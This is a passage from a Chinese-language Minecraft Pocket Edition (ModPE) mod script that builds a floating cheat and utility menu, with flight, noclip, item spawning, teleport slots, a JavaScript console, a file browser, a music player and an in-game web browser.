勾选(layout,astr[237],aswi[29]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[29]=!aswi[29]
写入主数据()
}catch(e){print(e)}
}}));


勾选(layout,astr[188],aswi[3]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[3]=!aswi[3]
写入主数据()
}catch(e){print(e)}
}}));
勾选(layout,astr[189],!aswi[23]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[23]=!aswi[23]
写入主数据()
}catch(e){print(e)}
}}));
勾选(layout,astr[190],aswi[13]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[13]=!aswi[13]
写入主数据()
try{音乐.stop()}catch(e){}
}catch(e){print(e)}
}}));

勾选(layout,astr[191],!aswi[2]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[2]=!aswi[2]
写入主数据()
}catch(e){print(e)}
}}));
勾选(layout,astr[192],aswi[0]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[0]=!aswi[0]
写入主数据()
}catch(e){print(e)}
}}));

按钮(layout,astr[193],-1).setOnClickListener(new pg.avVOCL({
onClick:
function(viewarg)
{
读取主数据()
try{
var layout=制作菜单(scrwid/2)

//添加组件
文本(layout,astr[42],5);
文本(layout,astr[43])
按钮(layout,astr[44]+"1",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){aswi[24]=false
写入主数据()
print(astr[44]+"1")}}))
按钮(layout,astr[44]+"2",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){aswi[24]=true
写入主数据()
print(astr[44]+"2")
}}))
}catch(e){alert(astr[2]+":\n"+e);}
}}))
 
按钮(layout,astr[194],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
读取主数据()
try{
var layout=制作菜单(scrwid/2)
//添加组件
文本(layout,astr[28],5);
文本(layout,astr[29])

var edit=输入(layout,附加指令读取,astr[30])
按钮(layout,astr[31],-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
var fun=edit.getText();
try{eval(""+fun);}catch(e){print(astr[2]+e);}
}}))

按钮(layout,astr[32],-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
附加指令读取=edit.getText();
写入主数据();
print(astr[0]+"\n"+astr[33]);
}}))

}catch(e){alert(astr[2]+":\n"+e);}
}}))

分割线(layout)
var title函数=输入(layout,temptext,astr[195])

按钮(layout,astr[196],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){try{
var 函数=title函数.getText();
temptext=函数;
var x=Player.getX();
var y=Player.getY();
var z=Player.getZ();
eval(""+函数);
print(astr[87]);
}catch(e){print(astr[2]+e);}
}}))
if(aswi[28]){
分割线(layout)
var 语言=输入(layout,temptext,astr[220])

按钮(layout,astr[220],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){try{
var a=String(语言.getText()),s=""
for(i=0;i<astr.length;i++){
if(String(astr[i]).search(a)!=-1){s+=astr[i]+":["+i+"]\n"}}
alert(a+":\n"+s,astr[19])
}catch(e){print(astr[2]+e);}
}}))
分割线(layout)}
按钮(layout,astr[197],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){print(astr[198])
性能测试()
}}))
if(aswi[28]){
按钮(layout,astr[219],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
try{
var a=检索函数(ctx.getDir(astr[236],0)+"/"+inf.n+".js")
alert(a.split("\n\n").length+"\n\n"+a,astr[19])
}catch(e){print(astr[2]+e)}
}}))}
按钮(layout,astr[199],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){print(astr[0])
pub=[]
}}))

按钮(layout,astr[200],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
print(astr[201][0]+主目录+astr[201][1])
try{ModPE.takeScreenshot(主目录+"yzr截图.png");}catch(e){print(e)}
}}))
 
按钮(layout,astr[202],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
if(存在(主目录+"设置.txt")){文件(主目录+"设置.txt").delete();
print(astr[174]);}
}}))

}}))
 
按钮(layout,astr[203],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){open按钮设置Menu();
}}))

按钮(layout,astr[204],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
var layout=制作菜单(scrwid/4)
文本(layout,astr[204],5)

按钮(layout,astr[205],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){alert(alert内容[2]);
}}))
按钮(layout,astr[206],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){alert(alert内容[3]);
}}))
按钮(layout,astr[207],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){alert(alert内容[1]);
}}))
按钮(layout,astr[208],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){alert(alert内容[0]);
}}))
按钮(layout,astr[209],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){alert(alert内容[4]);
}}))
按钮(layout,astr[210],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[88],astr[89],12,1000,600,0,0);
}}))
按钮(layout,astr[212],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){alert(公告,astr[213])
}}))
按钮(layout,astr[216],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
打开窗口(astr[88],astr[221],11,1000,600,0,0);
}}))

按钮(layout,astr[214],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
发邮件(astr[215][0]+inf.n+astr[215][1],astr[215][2]); 
}}))
}}))
按钮(layout,astr[218],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
downloadUpdate()
}}))
// }catch(e){
//alert(astr[2]+":\n"+e);
//}
}
function 分离路径(str){
var b=str.split("/").pop()
return [str.replace(b,""),b];
}
/*function 删除文件夹(path){
var a=文件浏览(path)
var i=0
while(i<a.length){
if(是否文件夹(a[i])){文件(a[i]).delete()}
else{删除文件夹(a[i])}
i++}}*/
function 播放器更新(widget,which,widget2){
runOnUiThread(function(){try{new pg.ao.Handler().postDelayed(new pg.jlR({run:function(){
var d=which.getCurrentPosition()
var m=Math.floor(d/60000);if(m<10){m="0"+m}
var s=Math.floor((d-60000*m)/1000)
if(s<10){s="0"+s}
widget2.setText(m+":"+s)
widget.setProgress(d/1000)
播放器更新(widget,which,widget2)
}}),50)}catch(err){return}})
}

function 复制文件(path1,path2){
if(path1==path2){print(astr[224]);
runOnUiThread(function(){复制按钮.dismiss()})
return}
print("(´・ω・`)")
runThread(function(){
try{
var r=new pg.jiFIS(new pg.jiF(path1)).getChannel();
var w=new pg.jiFOS(new pg.jiF(path2)).getChannel();
r.transferTo(0,r.size(),w)
}catch(e){print(astr[2]+e)}
print(astr[0])
runOnUiThread(function(){复制按钮.dismiss()})
})
}
function 打开窗口(标题a,组件,窗号,窗口宽,窗口高,x,y){
if(窗口宽==0){窗口宽=300;}
if(窗口高==0){窗口高=400;}
runThread(function(){
runOnUiThread(function(){try{
var winx=x,winy=y
var 总布局=new pg.awLL(ctx);
总布局.setOrientation(1);
总布局.setGravity(17);
var 标题栏=new pg.awLL(ctx);
外观(标题栏,-1,-2);
色(标题栏,0)
var 控制栏=new pg.awLL(ctx);
外观(控制栏,-1,-2);
控制栏.setGravity(5)
色(控制栏,2,0,0,0,0)
文本(标题栏,"♠ ")
var 主标题=文本(标题栏,标题a);

var 锁定窗口=文本(控制栏,"★  ");
var lwin=true
锁定窗口.setOnClickListener(new pg.avVOCL({onClick:function(){
lwin=!lwin
if(lwin){锁定窗口.setText("★  ");print("关闭焦点")}
if(!lwin){锁定窗口.setText("☆  ");print("开启焦点")}
win.setFocusable(!lwin)
win.update(winx,winy,-1,-1)
}}));

var 最小化=文本(控制栏,"∅  ");

最小化.setOnClickListener(new pg.avVOCL({onClick:function(){
try{
var minwin=new pg.awLL(ctx);
var minbutt=按钮(minwin,String(主标题.getText()).charAt(0)+"…",50,50,0,0)
minbutt.setOnClickListener(new pg.avVOCL({onClick:function(){
打开窗口(标题a,组件,窗号,窗口宽,窗口高,winx,winy);
minmain.dismiss()
}}));
var minmain=色(新建窗口(-2,-2,minwin,false),2,0,0,0,0)
var mX,mY;minbutt.setOnTouchListener(new pg.avVOTL({onTouch:function(v, e){switch(e.getAction()){case 0:mX=e.getX();mY=e.getY();break;case 2:var delX=parseInt(e.getX()-mX)*0.5;var delY=parseInt(e.getY()-mY)*0.5;winx+=delX;winy+=delY;minmain.update(parseInt(winx),parseInt(winy), -1,-1);break;}return false;}})); 
minmain.showAtLocation(ctx.getWindow().getDecorView(),0,winx,winy);
win.dismiss();win=null;
}catch(e){print(e)}

}}));

var 关闭窗口=文本(控制栏,"ㄨ");
关闭窗口.setOnClickListener(new pg.avVOCL({onClick:function(){
win.dismiss();win=null;
}}));
总布局.addView(标题栏);
标题栏.addView(控制栏);
var 滑动布局=new pg.aw.ScrollView(ctx);
var $4=new pg.awLL(ctx);
var 副标题=new pg.awLL(ctx);
总布局.addView(副标题)
$4.setOrientation(1);
外观($4,-1,-1)
外观(总布局,-1,-1)
外观(滑动布局,-1,-1);
滑动布局.addView($4);
总布局.addView(滑动布局)
//添加组件~~~~~~~~~~~~~~~~~~~~?
if(aswi[26]){$4=制作菜单(aswi[29]?scrwid/4:scrwid/2)}

if(标题a==astr[196]){
窗口宽=400
窗口高=500
按钮(副标题,"=>>",-2,-2).setOnClickListener(new pg.avVOCL({
onClick:function(v){
var a=edit.getText()
var b=text.getText()
组件=b
try{eval(a+"")}catch(e){text.setText(b+"\n>"+a+"\n"+astr[2]+":"+e);return;}
text.setText(b+"\n>"+a)
}}))
var edit=输入(副标题,"",astr[195],0,-1,-2,true)
var text=文本($4,组件)

}

if(标题a==astr[149]){
try{eval(读取(组件))}catch(e){
文本($4,"呃呃，貌似自定义窗口出错了⊙﹏⊙\n\n错误信息:\n"+e)
主标题.setText("错误提示")
色(标题栏,2,255,255,0,0)
分割线($4)
按钮($4,"保存模板以制作",-1).setOnClickListener(new pg.avVOCL({onClick:function(){
写入模板()
}}));
}
}

if(标题a==astr[126]){
窗口宽=800
窗口高=600
按钮(副标题,"保存",-2,-2).setOnClickListener(new pg.avVOCL({
onClick:function(v){
写入(组件,edit.getText())
print(astr[0])
}}))
文本(副标题,分离路径(组件)[1])
var edit=文本($4,读取(组件))
edit.setOnClickListener(new pg.avVOCL({
onClick:function(v){ 
打开输入框(edit)
}}))

}
if(标题a==astr[150]){
窗口宽=400
窗口高=500
按钮(副标题,"=>>",-2,-2).setOnClickListener(new pg.avVOCL({
onClick:function(v){
var a=edit.getText()
var b=text.getText()
组件=b
try{命令行(a)}catch(e){text.setText(b+"\n>"+a+"\n"+astr[2]+":"+e)
return}
text.setText(b+"\n>"+a)
}}))
var edit=输入(副标题,"","命令",0,-1,-2,true)
var text=文本($4,组件)
}

if(标题a==astr[151]){
窗口宽=400
窗口高=500
try{
var up=分离路径(组件[0])[0]
文本(副标题,up).setOnClickListener(new pg.avVOCL({
onClick:function(v){
if(aswi[25]){
aswi[25]=false
aswi[27]=true
复制文件(复制路径,up+复制路径.split("/").pop())
}
else{打开窗口(astr[151],文件浏览(up.replace(up.split("/").pop(),"")),4,400,500,0,0);}
}}))

for(i=0;i<组件.length;i++){
eval("var b"+i+"=外观(色(文本($4,分离路径(组件["+i+"])[1]),0),-1,文字大小*5,5);if(是否文件夹(组件["+i+"])){色(b"+i+",1);}\nb"+i+".setOnClickListener(new pg.avVOCL({onClick:function(v){try{打开窗口(astr[151],文件浏览(组件["+i+"]),4,400,500,0,0);}catch(e){}}}));");}}catch(e){return}
}

if(标题a==astr[127]){
窗口宽=400
窗口高=-2
var 暂停=组件[1],随机=组件[3]
文本($4,分离路径(组件[0])[1])
if(组件[2]==null){
组件[2]=new android.media.MediaPlayer();
组件[2].setDataSource(组件[0]);
组件[2].prepare();}
if(!组件[1]){组件[2].start();}

组件[2].setOnCompletionListener(new android.media.MediaPlayer.OnCompletionListener(){onCompletion: function(v){
try{
组件[2].stop()
var a=文件浏览(分离路径(组件[0])[0])
var i=0,u=0
while(i<a.length){if(组件[0]==a[i]){u=i+1;}
i++;}
if(u>=a.length){u=0;}
if(随机){u=random(0,a.length-1)}
if(bb){a[u]=组件[0]}
if(win==null){组件[2]=new android.media.MediaPlayer();
组件[2].setDataSource(a[u]);
组件[2].prepare();
组件[2].start();}
if(win!=null){win.dismiss()
打开窗口(astr[127],[a[u],false,null,随机,bb],5,400,500,winx,winy);}
}catch(e){print(e)}
}})
var a=拖动($4,组件[2].getCurrentPosition()/1000,组件[2].getDuration()/1000)
a.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onStopTrackingTouch:function(v){
组件[2].seekTo(a.getProgress()*1000)
}}))

var $42=new pg.awLL(ctx);
var 播放时间=文本($42,"")

按钮($42,"⏪",50,50,5,0).setOnClickListener(new pg.avVOCL({
onClick:function(v){
try{
var a=文件浏览(分离路径(组件[0])[0])
var i=0,u=0
while(i<a.length){if(组件[0]==a[i]){u=i-1;}
i++;}
if(u<0){u=a.length-1;}
组件[2].stop()
if(随机){u=random(0,a.length-1)}
win.dismiss()
打开窗口(astr[127],[a[u],false,null,随机,bb],5,400,500,winx,winy);
}catch(e){print(e)}
}}))
var bb=组件[4]
var aa=按钮($42,"",50,50,5,0)
if(!bb){aa.setText("↺ ")}
if(bb){aa.setText("↺1")}
aa.setOnClickListener(new pg.avVOCL({
onClick:function(v){
bb=!bb
if(!bb){aa.setText("↺ ")}
if(bb){aa.setText("↺1")}
}}))

var button=按钮($42,"❙❙",50,50,5,0)
if(暂停){button.setText("▶");}
if(!暂停){button.setText("❙❙")}
button.setOnClickListener(new pg.avVOCL({
onClick:function(v){
if(!暂停){
组件[2].pause()
暂停=true;button.setText("▶");}
else if(暂停){
组件[2].start()
暂停=false;button.setText("❙❙")}
组件[1]=暂停
}}))
var sj=按钮($42,"",50,50,5,0)
if(!随机){sj.setText("⇉")}
if(随机){sj.setText("⇄")}
sj.setOnClickListener(new pg.avVOCL({
onClick:function(v){
随机=!随机
if(!随机){sj.setText("⇉")}
if(随机){sj.setText("⇄")}
}}))

按钮($42,"⏩",50,50,5,0).setOnClickListener(new pg.avVOCL({
onClick:function(v){
try{
var a=文件浏览(分离路径(组件[0])[0])
var i=0,u=0
while(i<a.length){if(组件[0]==a[i]){u=i+1;}
i++;}
if(u>=a.length){u=0;}
组件[2].stop()
if(随机){u=random(0,a.length-1)}
win.dismiss()
打开窗口(astr[127],[a[u],false,null,随机,bb],5,400,500,winx,winy);
}catch(e){print(e)}
}}))

$4.addView($42)
关闭窗口.setOnClickListener(new pg.avVOCL({onClick:function(){
win.dismiss();win=null;组件[2].stop()
}}));
播放器更新(a,组件[2],播放时间)
}

if(标题a==astr[128]){
文本($4,分离路径(组件)[1])
窗口宽=scrwid/1.2
窗口高=scrhei/1.2
var wx=0,wy=0
var a=拖动($4,0,scrwid)
a.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:function(v){
wx=a.getProgress()
button.setLayoutParams(new pg.awLL.LayoutParams(wx,wy));
button.setScaleType(pg.awIV.ScaleType.FIT_CENTER)
}}))

var fa=拖动($4,0,scrwid)
fa.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:function(v){
wy=fa.getProgress()
button.setLayoutParams(new pg.awLL.LayoutParams(wx,wy));
button.setScaleType(pg.awIV.ScaleType.FIT_CENTER)
}}))

var $42=new pg.awLL(ctx);
var button=new pg.awIV(ctx);button.setBackgroundDrawable(pg.agd.BitmapDrawable(new pg.ag.BitmapFactory.decodeFile(组件)));
button.setScaleType(pg.awIV.ScaleType.FIT_CENTER)
$42.addView(button);
$4.addView($42);
}

if(标题a==astr[88]){
窗口宽=1000
窗口高=600
var web=new android.webkit.WebView(ctx);
web.getSettings().setJavaScriptEnabled(true)
web.setWebChromeClient(new android.webkit.WebChromeClient());
web.setWebViewClient(new android.webkit.WebViewClient());
web.loadUrl(组件);

按钮(副标题,"<",50,50).setOnClickListener(new pg.avVOCL({
onClick:function(v){
if(web.canGoBack()){web.goBack()}
}}))

按钮(副标题,">",50,50).setOnClickListener(new pg.avVOCL({
onClick:function(v){
if(web.canGoForward()){web.goForward()}
}}))

按钮(副标题,"↺",50,50).setOnClickListener(new pg.avVOCL({
onClick:function(v){
web.reload()
}}))


var idint=输入(副标题,组件,"地址",0,300,70,true);
按钮(副标题,"→",50,50).setOnClickListener(new pg.avVOCL(){
onClick:function(v){
try{
web.loadUrl(""+idint.getText())}catch(e){print(e)}
}})

按钮(副标题,"搜",50,50).setOnClickListener(new pg.avVOCL(){
onClick:function(v){
try{
web.loadUrl("https://m.baidu.com/s?from=1086k&word="+encodeURI(idint.getText()))}catch(e){print(e)}
}})

按钮(副标题,"在浏览器打开",-2,50).setOnClickListener(new pg.avVOCL(){
onClick:function(v){
跳转(组件)
}})

var layout = new pg.awLL(ctx); 
layout.addView(web)
$4.addView(layout)

web.setDownloadListener(new android.webkit.DownloadListener({  
onDownloadStart:function(url,userAgent,Name,MIMEtype,size){
var url2=pg.an.Uri.parse(url)
var intent=new pg.ac.Intent(pg.ac.Intent.ACTION_VIEW,url2)
ctx.startActivity(intent) 
}}))
}

if(标题a==astr[152]){
窗口宽=-2,窗口高=-2;
外观(滑动布局,0,0)
var lay=new pg.awLL(ctx);
var title=文本(lay,"总设值:"+总设值)

var fa=拖动(lay,总设值,64,240)
fa.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
总设值=fa.getProgress();
title.setText("总设值:"+总设值)}}))
总布局.addView(lay)

var $2=new pg.awLL(ctx);
外观($2,-2,-2);

按钮($2,"关闭",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(0)
}}));

按钮($2,"土豪",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(1)
}}));

按钮($2,"生成",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(2)
}}));

按钮($2,"改名",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(3)
}}));

总布局.addView($2);

var $7=new pg.awLL(ctx);
外观($7,-2,-2);

按钮($7,"爆菊",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(4)
}}));

按钮($7,"还原",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(5)
}}));

按钮($7,"秒杀",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(6)
}}));

按钮($7,"闪电",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(7)
}}));

总布局.addView($7);
var $12=new pg.awLL(ctx);
外观($12,-2,-2);

按钮($12,"评价",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(8)
}}));
按钮($12,"送钻",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(9)
}}));
按钮($12,"重生",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(10)
}}));
按钮($12,"骑行",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(11)
}}));
总布局.addView($12);
var $17=new pg.awLL(ctx);
外观($17,-2,-2);
按钮($17,"核弹",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(12)
}}));
按钮($17,"互骑",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(13)
}}));
按钮($17,"捡物",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(14)
}}));
按钮($17,"秒挖",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(15)
}}));
总布局.addView($17);
var $22=new pg.awLL(ctx);
外观($22,-2,-2);
按钮($22,"穿墙",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(16)
}}));
按钮($22,"抽奖",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(17)
}}));
按钮($22,"神器",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
神器选择(18)
}}));
按钮($22,"帮助",80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
alert("神器帮助:\n神器物品id:"+物品id组[2]+"\n土豪模式:使用神器点击普通方块变成土豪方块\n生成作者:生成作者(纯属娱乐)\n改名:聊天框输入/改名字 [你要的名字] 后神器点击实体直接改名\n爆菊:高级秒杀…\n还原:还原土豪模式的方块，神器点击还原\n秒杀:神器点实体秒杀不解释\n闪电:神器点击方块或实体打闪电\n评价:聊天框输入好评或差评(不建议)\n送钻:神器点击方块送钻石(调整总设值来设置送钻石个数)\n设出生点:神器点击方块就能设置\n骑动物:神器点击实体骑上该实体\n核弹:神器点方块爆炸(调整总设值以调整威力)\n动物骑动物:点击一个实体，之后再点一个会让第一个实体骑上第二个实体\n捡物品:拿着神器，所有掉落物都是你的\n秒挖:神器点击方块就秒挖\n穿墙:点击眼前的方块即可穿墙，不要点坑里的，会…\n抽奖:使用生的鄙视牌钻石点击地面抽奖\n记得一个功能用好了及时关闭！！！！");
}}));
总布局.addView($22);}

if(标题a==astr[153]){var temp=new pg.awLL(ctx);
按钮(temp,"出生",90,50,5,0).setOnClickListener(new pg.avVOCL({
onClick:
function(viewarg){try{procCmd("spawnpoint")}catch(e){print(e)}
}}))

按钮(temp,"自杀",90,50,5,0).setOnClickListener(new pg.avVOCL({
onClick:
function(viewarg) {try{procCmd("kill")}catch(e){print(e)}
}}))
 
按钮(temp,"回出",90,50,5,0).setOnClickListener(new pg.avVOCL({
onClick:
function(viewarg) {try{procCmd("spawn")}catch(e){print(e)}
}}))
$4.addView(temp)

for(var i=1;i<=20;i++){
eval("var g$"+i+"=按钮($4,null,-1);\nif(存在(主目录+\"地图传送点/\"+Level.getWorldDir()+\"/传送点"+i+".txt\")){g$"+i+".setText(\"读取"+i+"\");}\nelse{g$"+i+".setText(\"保存"+i+"\");}\ng$"+i+".setOnClickListener(new pg.avVOCL({\nonClick:\nfunction(v){\nif(存在(主目录+\"地图传送点/\"+Level.getWorldDir()+\"/传送点"+i+".txt\")){读取传送点("+i+");}\nelse{写入传送点("+i+");g$"+i+".setText(\"读取"+i+"\");print(\"保存成功，长按删除\");}\n}}));\ng$"+i+".setOnLongClickListener(new pg.avVOLCL({\nonLongClick:\nfunction(v){\nif(存在(主目录+\"地图传送点/\"+Level.getWorldDir()+\"/传送点"+i+".txt\")){文件(主目录+\"地图传送点/\"+Level.getWorldDir()+\"/传送点"+i+".txt\").delete();g$"+i+".setText(\"保存"+i+"\");print(\"删除成功\");}\nreturn true;\n}}));");
}}

if(标题a==astr[154]){
var 等级=Player.getLevel()
var title=文本($4,"等级"+等级+"")
var fa=拖动($4,等级,32767)
fa.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
等级=fa.getProgress();
Player.setLevel(等级)
title.setText("等级"+等级+"")}}))

var 放大=0
var title1=文本($4,"视角放大:"+放大+"\n(点我重置)")
title1.setOnClickListener(new pg.avVOCL({onClick:function(v){
ModPE.resetFov()
}}))
var fb=拖动($4,放大,1500)
fb.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
放大=fb.getProgress()/10
ModPE.setFov(放大)
title1.setText("视角放大:"+放大+"\n(点我重置)")}}))

勾选($4,"开启飞行",Player.canFly()).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
Player.setCanFly(!Player.canFly())
}catch(e){print(e)}
}}));

勾选($4,"开启疾跑",aswi[7]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
if(!aswi[7]){aswi[7]=true;ModPE.setGameSpeed(35);}
else{aswi[7]=false;ModPE.setGameSpeed(20);}
}catch(e){print(e)}
}}));

勾选($4,"开启无敌",aswi[21]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[21]=!aswi[21]
}catch(e){print(e)}
}}));

勾选($4,"开启穿墙",aswi[6]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
if(!aswi[6]){aswi[6]=true;Entity.setCollisionSize(getPlayerEnt(),0,0);}
else{aswi[6]=false;Entity.setCollisionSize(getPlayerEnt(),0.7,1.8);}
}catch(e){print(e)}
}}));
勾选($4,"显示坐标",aswi[17]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[17]=!aswi[17]
}catch(e){print(e)}
}}));

勾选($4,"死亡不掉",aswi[18]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[18]=!aswi[18]
}catch(e){print(e)}
}}));
}

if(标题a==astr[155]){
var eid=Player.getCarriedItem()
eco=Player.getCarriedItemCount()
edm=Player.getCarriedItemData()

var 实体物品标题=文本($4,"添加物品:"+eid+","+eco+","+edm)

var idint=输入($4,eid,"物品id",null,null,null,true);

var fa=拖动($4,eco,255)
fa.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
eco=fa.getProgress();
实体物品标题.setText("添加物品:"+idint.getText()+","+eco+","+edm);
}}))

var dmgint=输入($4,edm,"物品特殊数据值",null,null,null,true);

按钮($4,"添加物品",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{addItemInventory(idint.getText(),eco,dmgint.getText());cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

var nameint=输入($4,"","物品自定义名称",null,null,null,true)
按钮($4,"设置物品名称",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{Player.setItemCustomName(Player.getSelectedSlotId(),nameint.getText())
cM(astr[0]);}catch(e){cM(astr[1]);}
}}))
分割线($4)
for(var i=1;i<=20;i++){eval("var f$"+i+"=按钮($4,null,-1)\nif(存在(主目录+\"物品栏保存/物品栏"+i+".txt\")){f$"+i+".setText(\"读取"+i+"\")}\nelse{f$"+i+".setText(\"保存"+i+"\")}\nf$"+i+".setOnClickListener(new pg.avVOCL({\nonClick:\nfunction(v){\nif(!存在(主目录+\"物品栏保存/\")){mkdir(主目录+\"物品栏保存/\")}\nif(存在(主目录+\"物品栏保存/物品栏"+i+".txt\")){读取物品栏("+i+");print(\"读取成功\")}\nelse{保存物品栏("+i+");f$"+i+".setText(\"读取"+i+"\");print(\"保存成功，长按删除\")}\n}}))\nf$"+i+".setOnLongClickListener(new pg.avVOLCL({\nonLongClick:\nfunction(v){\nif(存在(主目录+\"物品栏保存/物品栏"+i+".txt\")){文件(主目录+\"物品栏保存/物品栏"+i+".txt\").delete();f$"+i+".setText(\"保存"+i+"\");print(\"删除成功\");}\nreturn true\n}}))");}
}

if(标题a==astr[156]){var $2=new pg.awLL(ctx);
外观($2,-1,-2);
按钮($2,"生存",140).setOnClickListener(new pg.avVOCL({onClick:function(){
Level.setGameMode(0)
}}));
按钮($2,"创造",140).setOnClickListener(new pg.avVOCL({onClick:function(){
Level.setGameMode(1)
}}));
$4.addView($2);

var $2=new pg.awLL(ctx);
外观($2,-1,-2);
按钮($2,"冒险",140).setOnClickListener(new pg.avVOCL({onClick:function(){
Level.setGameMode(2)
}}));
按钮($2,"旁观",140).setOnClickListener(new pg.avVOCL({onClick:function(){
Level.setGameMode(3)
}}));
$4.addView($2);

var temp=new pg.awLL(ctx);
var 时间=Level.getTime()
var title=文本(temp,"时间"+时间)
var base6
if(!锁定时间[0]){base6=unlockb;}
if(锁定时间[0]){base6=lockb;}
var imageview=new pg.awIV(ctx);
base(imageview,base6)
imageview.setOnClickListener(new pg.avVOCL({onClick:function(){
锁定时间[0]=!锁定时间[0]
锁定时间[1]=Level.getTime();
if(锁定时间[0]){base6=lockb;}
else{base6=unlockb;}
base(imageview,base6)
}}));
temp.addView(imageview)
$4.addView(temp)

var fa=拖动($4,Level.getTime(),24000)
fa.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
if(!锁定时间[0]){时间=fa.getProgress();
Level.setTime(时间)
title.setText("时间"+时间+"")}
else{fa.setProgress(锁定时间[1]);}
}}))

var title5=文本($4,"游戏难度")

var fb=拖动($4,Level.getDifficulty(),3)
fb.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
var a=fb.getProgress()
var b=""
Level.setDifficulty(a);
switch(a){
case 0:b="和平";break;
case 1:b="简单";break;
case 2:b="普通";break;
case 3:b="困难";break;
}
title5.setText("游戏难度("+b+")")
}}))

var title2=文本($4,"雨雪")

var fc=拖动($4,Math.round(Level.getRainLevel()*2),2)
fc.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
var a=fc.getProgress()
var b=""
Level.setRainLevel(a/2);
switch(a){
case 0:b="关闭";break;
case 1:b="小";break;
case 2:b="大";break;
}
title2.setText("雨雪("+b+")")
}}))

var title3=文本($4,"闪电")

var fd=拖动($4,Math.round(Level.getLightningLevel()*2),2)
fd.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
var a=fd.getProgress()
var b=""
Level.setLightningLevel(a/2);
switch(a){
case 0:b="关闭";break;
case 1:b="小";break;
case 2:b="大";break;
}
title3.setText("闪电("+b+")")
}}))

var title9=文本($4,"游戏速度")

var fe=拖动($4,20,100)
fe.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
var a=fe.getProgress()+1;
title9.setText("游戏速度:"+a);
ModPE.setGameSpeed(a);
}}))

var temp=new pg.awLL(ctx);
文本(temp,"打字颜色")
按钮(temp,"B",50,50,1,0).setOnClickListener(new pg.avVOCL({onClick:function(){
打字附加=ChatColor.BOLD;
}}));

